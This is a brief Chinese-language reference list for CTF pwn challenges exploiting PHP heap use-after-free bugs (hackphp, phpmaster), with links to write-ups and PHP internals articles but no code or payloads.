参考：https://9anux.org/2024/04/29/d3ctf2024/index.html

### 堆UAF：hackphp

‍

题目来源：D3CTF 2021 hackphp

参考：

https://github.com/UESuperGate/D3CTF-Source/blob/master/hackphp/exp.php

https://www.anquanke.com/post/id/235237#h2-5

### 堆UAF：phpmaster

‍

题目来源：第二届长城杯半决赛 phpmaster

参考：https://bbs.kanxue.com/thread-286086.htm

## 参考文章

https://www.anquanke.com/post/id/204404

https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters

https://www.bookstack.cn/read/php7-internal/7-implement.md

https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/

‍
